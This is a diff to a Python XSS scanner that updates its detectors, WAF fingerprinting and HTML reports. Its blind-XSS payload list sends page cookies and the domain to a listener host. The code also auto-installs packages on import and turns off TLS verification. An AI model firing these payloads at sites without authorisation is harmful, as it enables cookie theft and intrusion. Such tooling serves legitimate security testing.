@@ -38,7 +38,8 @@ import base64
 import zlib
 import pickle
 from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote, urlunparse
-
+import sys
+import subprocess
 import warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -46,22 +47,19 @@ warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 
 # ============================================================================
-# THIRD-PARTY IMPORTS WITH FALLBACKS
+# THIRD-PARTY IMPORTS WITH FALLBACKS (FIRST!)
 # ============================================================================
 
 try:
     import requests
     from requests.adapters import HTTPAdapter
     from requests.packages.urllib3.util.retry import Retry
-
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
-    print("Warning: requests module not available")
 
 try:
     from bs4 import BeautifulSoup
-
     BS4_AVAILABLE = True
 except ImportError:
     BS4_AVAILABLE = False
@@ -69,7 +67,6 @@ except ImportError:
 try:
     import aiohttp
     import aiofiles
-
     AIOHTTP_AVAILABLE = True
 except ImportError:
     AIOHTTP_AVAILABLE = False
@@ -81,38 +78,155 @@ try:
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.chrome.options import Options as ChromeOptions
     from selenium.webdriver.firefox.options import Options as FirefoxOptions
-
     SELENIUM_AVAILABLE = True
 except ImportError:
     SELENIUM_AVAILABLE = False
 
 try:
     import lxml.etree as ET
-
     LXML_AVAILABLE = True
 except ImportError:
     LXML_AVAILABLE = False
 
-try:
-    import js2py
 
-    JS2PY_AVAILABLE = True
-except ImportError:
-    JS2PY_AVAILABLE = False
 
 try:
     import dukpy
-
     DUKPY_AVAILABLE = True
 except ImportError:
     DUKPY_AVAILABLE = False
 
 try:
     from py_mini_racer import MiniRacer
-
     MINIRACER_AVAILABLE = True
 except ImportError:
     MINIRACER_AVAILABLE = False
+
+
+# ============================================================================
+# DEPENDENCY INSTALLER
+# ============================================================================
+
+def install_packages(packages):
+    """Install missing Python packages via pip"""
+    if not packages:
+        return
+
+    print("[*] Installing missing dependencies:")
+    print("    " + " ".join(packages))
+
+    subprocess.check_call(
+        [sys.executable, "-m", "pip", "install", *packages]
+    )
+
+
+# ============================================================================
+# DEPENDENCY CHECKER (FIXED LOGIC)
+# ============================================================================
+
+def check_dependencies():
+    """Check and auto-install required dependencies"""
+    missing = []
+
+    if not REQUESTS_AVAILABLE:
+        missing.append("requests")
+
+    if not BS4_AVAILABLE:
+        missing.append("beautifulsoup4")
+
+    if not SELENIUM_AVAILABLE:
+        missing.append("selenium")
+
+    if not AIOHTTP_AVAILABLE:
+        missing.extend(["aiohttp", "aiofiles"])
+
+
+    if not LXML_AVAILABLE:
+        missing.append("lxml")
+
+    if not MINIRACER_AVAILABLE:
+        missing.append("mini-racer")   # pip name
+
+    if not DUKPY_AVAILABLE:
+        missing.append("dukpy")
+
+    # Remove duplicates
+    missing = sorted(set(missing))
+
+    if missing:
+        install_packages(missing)
+        print("[✓] Dependencies installed successfully\n")
+
+        # 🔁 RE-IMPORT AFTER INSTALL (CRITICAL FIX)
+        globals().update(reload_dependencies())
+
+
+# ============================================================================
+# RELOAD IMPORTS TO UPDATE FLAGS (NO API CHANGE)
+# ============================================================================
+
+def reload_dependencies():
+    updated = {}
+
+    try:
+        import requests
+        from requests.adapters import HTTPAdapter
+        from requests.packages.urllib3.util.retry import Retry
+        updated["REQUESTS_AVAILABLE"] = True
+    except ImportError:
+        updated["REQUESTS_AVAILABLE"] = False
+
+    try:
+        from bs4 import BeautifulSoup
+        updated["BS4_AVAILABLE"] = True
+    except ImportError:
+        updated["BS4_AVAILABLE"] = False
+
+    try:
+        import aiohttp
+        import aiofiles
+        updated["AIOHTTP_AVAILABLE"] = True
+    except ImportError:
+        updated["AIOHTTP_AVAILABLE"] = False
+
+    try:
+        from selenium import webdriver
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support.ui import WebDriverWait
+        from selenium.webdriver.support import expected_conditions as EC
+        from selenium.webdriver.chrome.options import Options as ChromeOptions
+        from selenium.webdriver.firefox.options import Options as FirefoxOptions
+        updated["SELENIUM_AVAILABLE"] = True
+    except ImportError:
+        updated["SELENIUM_AVAILABLE"] = False
+
+    try:
+        import lxml.etree as ET
+        updated["LXML_AVAILABLE"] = True
+    except ImportError:
+        updated["LXML_AVAILABLE"] = False
+
+    try:
+        import dukpy
+        updated["DUKPY_AVAILABLE"] = True
+    except ImportError:
+        updated["DUKPY_AVAILABLE"] = False
+
+    try:
+        from py_mini_racer import MiniRacer
+        updated["MINIRACER_AVAILABLE"] = True
+    except ImportError:
+        updated["MINIRACER_AVAILABLE"] = False
+
+    return updated
+
+
+# ============================================================================
+# RUN DEPENDENCY CHECK (SAFE)
+# ============================================================================
+
+check_dependencies()
+
 
 
 # ============================================================================
@@ -142,7 +256,7 @@ class ScannerConfig:
     use_headless: bool = True
     use_proxy: str = None
     follow_redirects: bool = True
-    verify_ssl: bool = True #False edited
+    verify_ssl: bool = False #False edited
 
     # Detection settings
     detect_waf: bool = True
@@ -157,6 +271,11 @@ class ScannerConfig:
     output_format: str = "json"
     verbose: bool = False
     debug: bool = False
+
+    require_reflection: bool = True  # Must see payload reflected
+    require_context: bool = True  # Must be in dangerous context
+    min_confidence: float = 0.7  # Minimum confidence to report
+    validate_dom: bool = True  # Validate DOM XSS with execution
 
 
 class XSSPayloads:
@@ -207,12 +326,12 @@ class XSSPayloads:
 
     # Blind XSS payloads
     BLIND = [
-        '<script>fetch("http://collaborator/"+document.cookie)</script>',
-        '<img src=x onerror="new Image().src=\'http://collaborator/?\'+btoa(document.cookie)">',
-        '<script>new Image().src="http://collaborator/?"+document.domain</script>',
-        '<iframe src="http://collaborator"></iframe>',
-        '<link rel=ping href="http://collaborator">',
-        '<script>navigator.sendBeacon("http://collaborator", document.cookie)</script>',
+        '<script>fetch("http://127.0.0.1:8008/P1/?data="+document.cookie)</script>',
+        '<img src=x onerror="new Image().src=\'http://127.0.0.1:8008/P2/?data=\'+btoa(document.cookie)">',
+        '<script>new Image().src="http://127.0.0.1:8008/P3/?domain="+document.domain</script>',
+        '<iframe src="http://127.0.0.1:8008"></iframe>',
+        '<link rel=ping href="http://127.0.0.1:8008">',
+        '<script>navigator.sendBeacon("http://127.0.0.1:8008/?data=", document.cookie)</script>',
     ]
 
     # Polyglot payloads (work in multiple contexts)
@@ -333,6 +452,8 @@ class ScanResult:
     requests_made: int = 0
     vulnerabilities_found: int = 0
     vulnerabilities: List[Vulnerability] = field(default_factory=list)
+    possible_vulnerabilities: List[Vulnerability] = field(default_factory=list)
+    possible_vulnerabilities_found :int=0
     pages: List[PageInfo] = field(default_factory=list)
     statistics: Dict[str, Any] = field(default_factory=dict)
     waf_detected: bool = False
@@ -879,7 +1000,7 @@ class XSSDetectionEngine:
         self.fingerprinter = TechnologyFingerprinter()
         self.waf_detector = WAFDetector()
 
-    def analyze_url(self, url: str, http_client: AdvancedHTTPClient) -> List[Vulnerability]:
+    def analyze_url(self, url: str,page:PageInfo, http_client: AdvancedHTTPClient) -> List[Vulnerability]:
         """Analyze a single URL for XSS vulnerabilities"""
         vulnerabilities = []
 
@@ -894,16 +1015,25 @@ class XSSDetectionEngine:
             if 'reflected' in self.config.scan_types:
                 reflected_vulns = self.detectors['reflected'].test(url, http_client, self.payload_generator)
                 vulnerabilities.extend(reflected_vulns)
+                logging.info("Reflected XSS Scan Completed...")
+
 
             # Test for DOM XSS (requires JavaScript analysis)
             if 'dom' in self.config.scan_types and SELENIUM_AVAILABLE:
                 dom_vulns = self.detectors['dom'].test(url, http_client, self.payload_generator)
                 vulnerabilities.extend(dom_vulns)
+                logging.info("DOM XSS Scan Completed...")
+
+            if 'blind' in self.config.scan_types:
+                blind_vulns = self.detectors['blind'].test(url, http_client, self.payload_generator)
+                vulnerabilities.extend(blind_vulns)
+                logging.info("Blind XSS Scan Completed...")
 
             # Test for stored XSS (requires form submission)
-            if 'stored' in self.config.scan_types:
+            '''if 'stored' in self.config.scan_types:
                 # First crawl to find forms
-                crawler = WebCrawler(http_client, ScannerConfig(max_pages=10))
+
+                crawler = WebCrawler(http_client, self.config)
                 pages = crawler.crawl(url)
 
                 for page in pages:
@@ -912,6 +1042,17 @@ class XSSDetectionEngine:
                             page.url, form, http_client, self.payload_generator
                         )
                         vulnerabilities.extend(stored_vulns)
+
+                logging.info("Stored XSS Scan Completed !")'''
+            if 'stored' in self.config.scan_types:
+                # First crawl to find forms
+                for form in page.forms:
+                    stored_vulns = self.detectors['stored'].test_form(
+                        page.url, form, http_client, self.payload_generator
+                    )
+                    vulnerabilities.extend(stored_vulns)
+
+                logging.info("Stored XSS Scan Completed !")
 
             # Add context to vulnerabilities
             for vuln in vulnerabilities:
@@ -968,7 +1109,7 @@ class ReflectedXSSDetector:
     def test_parameter(self, url: str, param_name: str,
                        http_client: AdvancedHTTPClient,
                        payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test a specific parameter for XSS"""
+        """Test a specific parameter for XSS - FIXED VERSION"""
         vulnerabilities = []
         payloads = payload_generator.get_reflected_payloads()
 
@@ -977,50 +1118,57 @@ class ReflectedXSSDetector:
                 # Parse URL
                 parsed = urlparse(url)
 
-                # Check if payload contains javascript: protocol - skip these for GET requests
+                # Skip JavaScript/DATA payloads for GET parameters - they need special handling
                 if payload.lower().startswith(('javascript:', 'data:')):
-                    # These payloads are for DOM XSS, not reflected GET parameters
+                    # These are for DOM XSS testing, not reflected GET
                     continue
 
+                # Skip payloads with hash fragments for reflected testing
+                if '#' in payload:
+                    continue
 
                 # Prepare test URL with payload
-                params = parse_qs(parsed.query)
+                params = parse_qs(parsed.query, keep_blank_values=True)
 
                 # Clean the payload for URL inclusion
-                clean_payload = payload
                 # Remove problematic characters that break URL parsing
-                if clean_payload.startswith('javascript:'):
-                    # Encode the entire javascript: payload
-                    clean_payload = quote(clean_payload, safe='')
-                elif any(c in clean_payload for c in ['\n', '\r', '\t']):
-                    # Encode control characters
-                    clean_payload = quote(clean_payload)
+                clean_payload = payload
 
+                # Remove control characters and problematic sequences
+                clean_payload = re.sub(r'[\n\r\t]', '', clean_payload)
+
+                # Don't encode the entire payload if it's HTML, just URL-encode it
+                clean_payload = quote(clean_payload, safe='')
+
+                # Set the parameter with clean payload
                 params[param_name] = [clean_payload]
 
-                # Reconstruct URL
-                new_query = '&'.join([f"{k}={quote(v[0], safe='')}" for k, v in params.items()])
+                # Reconstruct URL properly
+                new_query = '&'.join(
+                    f"{k}={v[0]}" if isinstance(v, list) else f"{k}={v}"
+                    for k, v in params.items()
+                )
 
-                # Rebuild URL properly
                 test_url = urlunparse((
                     parsed.scheme,
                     parsed.netloc,
                     parsed.path,
                     parsed.params,
                     new_query,
-                    parsed.fragment
+                    ''  # Clear fragment for testing
                 ))
+
+                # Validate test URL
                 if not self.is_valid_test_url(test_url):
-                    logging.debug(f"Skipping invalid test URL: {test_url[:100]}...")
                     continue
 
                 # Make request
                 response = http_client.get(test_url)
 
-                # Check if payload is reflected
+                # Check if payload is reflected AND properly contextualized
                 if self.is_payload_reflected(payload, response.text):
-                    # Verify XSS
-                    if self.verify_xss(test_url, payload, http_client):
+                    # Verify XSS with better heuristics
+                    if self.verify_xss_reflected(test_url, payload, response.text):
                         vuln = self.create_vulnerability(
                             url=test_url,
                             param=param_name,
@@ -1034,6 +1182,76 @@ class ReflectedXSSDetector:
                 logging.debug(f"Parameter test failed for {param_name}: {e}")
 
         return vulnerabilities
+
+    def verify_xss_reflected(self, url: str, payload: str, response_text: str) -> bool:
+        """Better verification for reflected XSS"""
+
+        # ---------------------------------------------------------------------
+        # Prepare encoded variants (ALWAYS defined)
+        # ---------------------------------------------------------------------
+        encoded_versions = [
+            payload,
+            html.escape(payload),
+            payload.replace('<', '&lt;').replace('>', '&gt;'),
+            payload.replace('<', '%3C').replace('>', '%3E'),
+            payload.replace('"', '&quot;').replace("'", '&#x27;'),
+        ]
+
+        # ---------------------------------------------------------------------
+        # Check if any version is reflected
+        # ---------------------------------------------------------------------
+        matched_payload = None
+        idx = -1
+
+        for variant in encoded_versions:
+            idx = response_text.find(variant)
+            if idx != -1:
+                matched_payload = variant
+                break
+
+        if matched_payload is None:
+            return False
+
+        # ---------------------------------------------------------------------
+        # Analyze context (±100 chars)
+        # ---------------------------------------------------------------------
+        start = max(0, idx - 100)
+        end = min(len(response_text), idx + len(matched_payload) + 100)
+        context = response_text[start:end].lower()
+
+        # ---------------------------------------------------------------------
+        # Dangerous reflection patterns (with confidence)
+        # ---------------------------------------------------------------------
+        dangerous_patterns = [
+            # Inside <script> block
+            (r'<script[^>]*>.*' + re.escape(matched_payload) + r'.*</script>', 0.9),
+
+            # Inline event handler
+            (r'on\w+\s*=\s*["\'].*' + re.escape(matched_payload), 0.8),
+
+            # Dangerous URL attributes
+            (r'<[^>]*\b(href|src|action)\s*=\s*["\'].*' + re.escape(matched_payload), 0.7),
+
+            # Raw HTML injection
+            (r'<\w+[^>]*>.*' + re.escape(matched_payload) + r'.*</\w+>', 0.6),
+        ]
+
+        for pattern, confidence in dangerous_patterns:
+            if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
+                return confidence >= 0.6
+
+        # ---------------------------------------------------------------------
+        # Sanitization check (encoded output → safe)
+        # ---------------------------------------------------------------------
+        sanitization_markers = [
+            '&lt;', '&gt;', '&quot;', '&#x27;', '%3c', '%3e'
+        ]
+
+        if '<' in payload and '>' in payload:
+            if any(marker in context for marker in sanitization_markers):
+                return False
+
+        return False
 
     def test_path(self, url: str, http_client: AdvancedHTTPClient,
                   payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
@@ -1270,68 +1488,141 @@ class ReflectedXSSDetector:
 
         return False
 
-    def verify_xss(self, url: str, payload: str, http_client: AdvancedHTTPClient) -> bool:
-        """Verify XSS by checking if payload executes"""
-        # Method 1: Use JavaScript engine if available
-        if JS2PY_AVAILABLE:
+    def verify_xss(self, url: str, payload: str, http_client) -> bool:
+        """
+        Verify XSS by attempting JS execution, heuristics,
+        and reflection-context analysis.
+        """
+
+        safe_payload = self.make_payload_safe(payload)
+
+        # =========================================================================
+        # METHOD 1: JavaScript Engine Execution (BEST-EFFORT)
+        # =========================================================================
+
+        # ---- MiniRacer (PRIMARY) ----
+        if MINIRACER_AVAILABLE:
             try:
-                context = js2py.EvalJs()
-                # Set up mock browser environment
-                context.execute("""
-                    window = {};
-                    window.alert = function() { return true; };
-                    window.confirm = function() { return true; };
-                    window.prompt = function() { return true; };
-                    document = {};
-                    document.write = function(str) { return str.includes('script') || str.includes('alert'); };
-                    document.body = {};
-                    document.body.innerHTML = "";
-                    location = {};
-                    location.href = "";
+                from py_mini_racer import MiniRacer
+
+                ctx = MiniRacer()
+
+                # Minimal browser-like environment
+                ctx.eval("""
+                    var window = {};
+                    window.alert = function(){ return true; };
+                    window.confirm = function(){ return true; };
+                    window.prompt = function(){ return true; };
+
+                    var document = {};
+                    document.write = function(str){
+                        return str && (
+                            str.indexOf("script") !== -1 ||
+                            str.indexOf("alert") !== -1
+                        );
+                    };
+                    document.body = { innerHTML: "" };
+
+                    var location = { href: "" };
                 """)
 
-                # Try to execute safe version of payload
-                safe_payload = self.make_payload_safe(payload)
                 try:
-                    result = context.eval(safe_payload)
-                    return bool(result)
-                except:
+                    result = ctx.eval(safe_payload)
+                    if bool(result):
+                        return True
+                except Exception:
                     pass
-            except Exception as e:
-                logging.debug(f"JS2Py verification failed: {e}")
 
-        # Method 2: Check if payload would execute in browser
-        # This is a heuristic approach
-        execution_indicators = [
-            ('<script>', '</script>'),
-            ('<img', 'onerror='),
-            ('<svg', 'onload='),
-            ('<body', 'onload='),
-            ('javascript:', 'alert('),
-            ('data:text/html', '<script>')
+            except Exception as e:
+                logging.debug(f"MiniRacer verification failed: {e}")
+
+        # ---- DukPy (FALLBACK) ----
+        if DUKPY_AVAILABLE:
+            try:
+                import dukpy
+
+                js_env = """
+                    var window = {};
+                    window.alert = function(){ return true; };
+                    window.confirm = function(){ return true; };
+                    window.prompt = function(){ return true; };
+
+                    var document = {};
+                    document.write = function(str){
+                        return str && (
+                            str.indexOf("script") !== -1 ||
+                            str.indexOf("alert") !== -1
+                        );
+                    };
+                    document.body = { innerHTML: "" };
+
+                    var location = { href: "" };
+                """
+
+                try:
+                    result = dukpy.evaljs(js_env + safe_payload)
+                    if bool(result):
+                        return True
+                except Exception:
+                    pass
+
+            except Exception as e:
+                logging.debug(f"DukPy verification failed: {e}")
+
+        # =========================================================================
+        # METHOD 2: PAYLOAD HEURISTICS (FAST & EFFECTIVE)
+        # =========================================================================
+
+        payload_l = payload.lower()
+
+        execution_patterns = [
+            ("<script", "</script>"),
+            ("<img", "onerror"),
+            ("<svg", "onload"),
+            ("<body", "onload"),
+            ("javascript:", "alert"),
+            ("javascript:", "confirm"),
+            ("javascript:", "prompt"),
+            ("data:text/html", "<script"),
+            ("<iframe", "srcdoc"),
         ]
 
-        for start, end in execution_indicators:
-            if start in payload and end in payload:
+        for start, trigger in execution_patterns:
+            if start in payload_l and trigger in payload_l:
                 return True
 
-        # Method 3: Check reflection context
-        # If payload is reflected without encoding in script context
-        test_response = http_client.get(url).text
-        if payload in test_response:
-            # Check context around the reflection
-            idx = test_response.find(payload)
-            if idx > 0:
-                before = test_response[max(0, idx - 50):idx]
-                after = test_response[idx + len(payload):idx + len(payload) + 50]
+        # =========================================================================
+        # METHOD 3: REFLECTION CONTEXT ANALYSIS
+        # =========================================================================
 
-                # Check if in script tag
-                if '<script>' in before.lower() and '</script>' in after.lower():
-                    return True
-                # Check if in HTML attribute
-                if before.rstrip().endswith('="') or before.rstrip().endswith("='"):
-                    if after.startswith('"') or after.startswith("'"):
-                        return True
+        try:
+            response = http_client.get(url)
+            body = response.text
+        except Exception:
+            return False
+
+        if payload not in body:
+            return False
+
+        idx = body.find(payload)
+        if idx < 0:
+            return False
+
+        before = body[max(0, idx - 100):idx].lower()
+        after = body[idx + len(payload):idx + len(payload) + 100].lower()
+
+        # Script context
+        if "<script" in before and "</script>" in after:
+            return True
+
+        # HTML attribute context
+        if before.rstrip().endswith(("='", '="')):
+            if after.startswith(("'", '"')):
+                return True
+
+        # Inline handler context
+        if "onerror=" in before or "onload=" in before:
+            return True
 
         return False
 
@@ -1509,6 +1800,9 @@ class ReflectedXSSDetector:
             return True
         except Exception:
             return False
+
+
+
 
 
 class DOMXSSDetector:
@@ -2054,6 +2348,9 @@ class DOMXSSDetector:
             return False
 
 
+
+
+
 class StoredXSSDetector:
     """Detect stored XSS vulnerabilities"""
 
@@ -2068,7 +2365,7 @@ class StoredXSSDetector:
 
         try:
             # First, crawl to find input forms
-            crawler = WebCrawler(http_client, ScannerConfig(max_pages=10))
+            crawler = WebCrawler(http_client, self.config)
             pages = crawler.crawl(url)
 
             for page in pages:
@@ -2297,7 +2594,7 @@ class BlindXSSDetector:
     def __init__(self, config: ScannerConfig = None):
         self.config = config or ScannerConfig()
         self.payload_generator = XSSPayloadGenerator()
-        self.collaborator_url = None  # Would be set to actual collaborator
+        self.collaborator_url = "127.0.0.1:8008"  # Would be set to actual collaborator
 
     def test(self, url: str, http_client: AdvancedHTTPClient,
              payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
@@ -2543,8 +2840,8 @@ class TechnologyFingerprinter:
                 'Ruby': [r'X-Powered-By: Ruby', r'rails', r'_session_id'],
             },
             'Security Headers': {
-                'CSP': [r'Content-Security-Policy'],
-                'HSTS': [r'Strict-Transport-Security'],
+                'Content-Security-Policy': [r'Content-Security-Policy'],
+                'Strict-Transport-Security': [r'Strict-Transport-Security'],
                 'X-Frame-Options': [r'X-Frame-Options'],
                 'X-XSS-Protection': [r'X-XSS-Protection'],
                 'X-Content-Type-Options': [r'X-Content-Type-Options'],
@@ -2595,56 +2892,156 @@ class TechnologyFingerprinter:
 # ============================================================================
 
 class WAFDetector:
-    """Detect Web Application Firewalls"""
+    """Detect Web Application Firewalls - FIXED VERSION"""
 
     def __init__(self):
         self.waf_signatures = {
-            'Cloudflare': [r'cf-ray', r'__cfduid', r'cloudflare'],
-            'Akamai': [r'akamai', r'X-Akamai'],
-            'Imperva': [r'incap_ses', r'visid_incap'],
-            'AWS WAF': [r'AWS', r'X-Amz-Cf-Id'],
-            'ModSecurity': [r'mod_security', r'libmodsecurity'],
-            'FortiWeb': [r'FORTIWAFSID'],
-            'Barracuda': [r'barracuda'],
+            'Cloudflare': [
+                (r'cf-ray', r'CF-', r'__cfduid', r'cloudflare-err', r'cf-browser-verification'),
+                0.9
+            ],
+            'Akamai': [
+                (r'akamai', r'X-Akamai', r'X-Akamai-Transformed'),
+                0.8
+            ],
+            'Imperva': [
+                (r'incap_ses', r'visid_incap', r'X-CDN', r'Imperva'),
+                0.85
+            ],
+            'AWS WAF': [
+                (r'AWS', r'X-Amz-Cf-Id', r'X-Amz-Cf-Pop'),
+                0.8
+            ],
+            'ModSecurity': [
+                (r'Mod_Security', r'libmodsecurity', r'mod_security'),
+                0.7
+            ],
+            'FortiWeb': [
+                (r'FORTIWAFSID', r'FortiWeb'),
+                0.7
+            ],
+            'Barracuda': [
+                (r'barracuda', r'Barracuda'),
+                0.7
+            ],
         }
 
+        # Common security headers that are NOT WAF
+        self.security_headers = [
+            'Content-Security-Policy',
+            'Strict-Transport-Security',
+            'X-Frame-Options',
+            'X-XSS-Protection',
+            'X-Content-Type-Options',
+            'Referrer-Policy',
+            'Permissions-Policy',
+            'Expect-CT'
+        ]
+
+        # WAF block patterns in response body
+        self.block_patterns = [
+            (r'blocked.*(by|security|firewall)', 0.9),
+            (r'access.*denied', 0.8),
+            (r'security.alert', 0.8),
+            (r'forbidden.*403', 0.8),
+            (r'not.acceptable', 0.7),
+            (r'malicious.*activity', 0.8),
+            (r'detected.*attack', 0.8),
+        ]
+
     def detect(self, url: str, http_client: AdvancedHTTPClient) -> Dict[str, Any]:
-        """Detect WAF presence"""
-        result = {'detected': False, 'type': None, 'confidence': 0.0}
+        """Detect WAF presence - FIXED to avoid false positives"""
+        result = {
+            'detected': False,
+            'type': None,
+            'confidence': 0.0,
+            'evidence': []
+        }
 
         try:
-            # Make a request with suspicious payload
+            # First, make a normal request
+            normal_response = http_client.get(url)
+
+            # Check for SECURITY HEADERS (not WAF)
+            security_headers_found = []
+            for header in self.security_headers:
+                if header in normal_response.headers:
+                    security_headers_found.append(header)
+
+            # Make test request with suspicious payload
             test_payload = "<script>alert(1)</script>"
-            test_url = f"{url}?test={test_payload}"
+            test_url = f"{url}?xss_test={quote(test_payload)}"
 
-            response = http_client.get(test_url)
+            test_response = http_client.get(test_url)
 
-            # Check headers for WAF signatures
-            for waf_type, signatures in self.waf_signatures.items():
-                for sig in signatures:
-                    for header, value in response.headers.items():
-                        if re.search(sig, f"{header}: {value}", re.IGNORECASE):
+            # -------------------------------------------------
+            # METHOD 1: Check for WAF-specific headers
+            # -------------------------------------------------
+            for waf_type, (patterns, base_confidence) in self.waf_signatures.items():
+                for pattern in patterns:
+                    # Check response headers
+                    for header_name, header_value in test_response.headers.items():
+                        combined = f"{header_name}: {header_value}"
+                        if re.search(pattern, combined, re.IGNORECASE):
+                            # This is likely a real WAF
                             result['detected'] = True
                             result['type'] = waf_type
-                            result['confidence'] = 0.8
+                            result['confidence'] = base_confidence
+                            result['evidence'].append(f"WAF header found: {header_name}")
                             return result
 
-            # Check response body for WAF blocks
-            waf_blocks = [
-                r'blocked',
-                r'security',
-                r'forbidden',
-                r'not acceptable',
-                r'access denied',
-                r'cloudflare'
-            ]
+            # -------------------------------------------------
+            # METHOD 2: Check for block pages
+            # -------------------------------------------------
+            response_text = test_response.text.lower()
+            response_status = test_response.status_code
 
-            for block_pattern in waf_blocks:
-                if re.search(block_pattern, response.text, re.IGNORECASE):
+            # If we get blocked (403, 406, 429, etc.)
+            if response_status in [403, 406, 429, 503]:
+                result['detected'] = True
+                result['type'] = 'Generic'
+                result['confidence'] = 0.7
+                result['evidence'].append(f"Blocked status code: {response_status}")
+
+            # Check for block messages in response
+            for pattern, confidence in self.block_patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    result['detected'] = True
+                    result['type'] = 'Generic'
+                    result['confidence'] = max(result['confidence'], confidence)
+                    result['evidence'].append(f"Block message found: {pattern}")
+                    break
+
+            # -------------------------------------------------
+            # METHOD 3: Compare normal vs test responses
+            # -------------------------------------------------
+            normal_length = len(normal_response.text)
+            test_length = len(test_response.text)
+
+            # If test response is significantly different (block page)
+            if test_length < 1000 and abs(normal_length - test_length) > 500:
+                # Might be a block page
+                if not result['detected']:
                     result['detected'] = True
                     result['type'] = 'Generic'
                     result['confidence'] = 0.6
-                    break
+                    result['evidence'].append(f"Response length difference: {normal_length} vs {test_length}")
+
+            # -------------------------------------------------
+            # FINAL VALIDATION: Security headers are NOT WAF
+            # -------------------------------------------------
+            if security_headers_found and not result['detected']:
+                # Has security headers but no WAF detected
+                result['detected'] = False
+                result['type'] = f"Security Headers ({', '.join(security_headers_found)})"
+                result['confidence'] = 0.1
+                result['evidence'] = security_headers_found
+
+            # Very low confidence result - probably not WAF
+            if result['confidence'] < 0.5:
+                result['detected'] = False
+                result['type'] = 'No WAF detected'
+                result['confidence'] = 0.1
 
         except Exception as e:
             logging.debug(f"WAF detection failed: {e}")
@@ -2710,7 +3107,7 @@ class AdvancedXSSScanner:
 
             with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                 future_to_url = {
-                    executor.submit(self.detection_engine.analyze_url, page.url, self.http_client): page.url
+                    executor.submit(self.detection_engine.analyze_url, page.url,page, self.http_client): page.url
                     for page in pages[:self.config.max_pages]
                 }
 
@@ -2719,12 +3116,14 @@ class AdvancedXSSScanner:
                     try:
                         page_vulns = future.result()
                         vulnerabilities.extend(page_vulns)
-                        logging.info(f"Found {len(page_vulns)} vulnerabilities on {url}")
+                        logging.info(f"Found {len(page_vulns)} (Possibility) vulnerabilities on {url}")
                     except Exception as e:
                         logging.error(f"Error scanning {url}: {e}")
 
             #self.results.vulnerabilities = self.deduplicate_vulnerabilities(vulnerabilities)
             #self.results.vulnerabilities = self.smart_deduplicate(vulnerabilities)
+            self.results.possible_vulnerabilities = vulnerabilities
+            self.results.possible_vulnerabilities_found = len(vulnerabilities)
 
             self.results.vulnerabilities = self.deduplicate_vulnerabilities_advanced(vulnerabilities)
             self.results.vulnerabilities_found = len(self.results.vulnerabilities)
@@ -2979,12 +3378,14 @@ class ReportGenerator:
             'summary': {
                 'pages_scanned': scan_result.pages_scanned,
                 'vulnerabilities_found': scan_result.vulnerabilities_found,
+                'possible_vulnerabilities_found':scan_result.possible_vulnerabilities_found,
                 'waf_detected': scan_result.waf_detected,
                 'waf_type': scan_result.waf_type,
                 'technologies': scan_result.tech_stack
             },
             'statistics': scan_result.statistics,
             'vulnerabilities': [vuln.to_dict() for vuln in scan_result.vulnerabilities],
+            'possible_vulnerabilities':[vuln.to_dict() for vuln in scan_result.possible_vulnerabilities],
             'pages': [asdict(page) for page in scan_result.pages[:10]],  # First 10 pages
             'config': scan_result.config
         }
@@ -3030,6 +3431,8 @@ class ReportGenerator:
                 th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                 th {{ background: #f8f9fa; font-weight: bold; }}
                 .tech-tag {{ display: inline-block; background: #e9ecef; padding: 5px 10px; margin: 2px; border-radius: 3px; font-size: 12px; }}
+                .vuln-title {{display: flex;flex-wrap: wrap;gap: 0.5rem;align-items: center;}}
+                .vuln-url {{max-width: 100%;word-break: break-all;overflow-wrap: anywhere;white-space: normal;display: inline-block;}}
             </style>
         </head>
         <body>
@@ -3058,6 +3461,14 @@ class ReportGenerator:
                         <h3>High</h3>
                         <p style="font-size: 24px; font-weight: bold;">{high_count}</p>
                     </div>
+                    <div class="summary-card medium">
+                        <h3>Medium</h3>
+                        <p style="font-size: 24px; font-weight: bold;">{medium_count}</p>
+                    </div>
+                    <div class="summary-card low">
+                        <h3>Low</h3>
+                        <p style="font-size: 24px; font-weight: bold;">{low_count}</p>
+                    </div>
                 </div>
 
                 <h2>🔧 Technologies Detected</h2>
@@ -3068,8 +3479,21 @@ class ReportGenerator:
                 <h2>🛡️ WAF Detection</h2>
                 <p>{waf_status}</p>
 
-                <h2>📋 Vulnerability Details</h2>
-                {vulnerabilities_html}
+                <div class="filter-bar">
+                        <label for="vulnFilter">Show:</label>
+                    <select id="vulnFilter" onchange="filterVulns()">
+                    <option value="detected">Detected</option>
+                    <option value="possible">Possibility</option>
+                    </select>
+                </div>
+
+                <div id="detected-vulns" class="vuln-section">
+                    {vulnerabilities_html_detected}
+                </div>
+
+                <div id="possible-vulns" class="vuln-section" style="display:none;">
+                {vulnerabilities_html_possible}
+                </div>
 
                 <h2>📈 Statistics</h2>
                 <table>
@@ -3085,6 +3509,18 @@ class ReportGenerator:
                     <p>Scan completed: {end_time}</p>
                 </div>
             </div>
+            
+            <script>
+                function filterVulns() {{
+                const value = document.getElementById("vulnFilter").value;
+
+                    document.getElementById("detected-vulns").style.display =
+                        value === "detected" ? "block" : "none";
+
+                document.getElementById("possible-vulns").style.display =
+                    value === "possible" ? "block" : "none";
+                    }}
+            </script>
         </body>
         </html>
         """
@@ -3092,7 +3528,8 @@ class ReportGenerator:
         # Calculate counts
         critical_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'critical')
         high_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'high')
-
+        medium_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'medium')
+        low_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'low')
         # Technology tags
         tech_tags = ""
         for tech in scan_result.tech_stack:
@@ -3102,14 +3539,14 @@ class ReportGenerator:
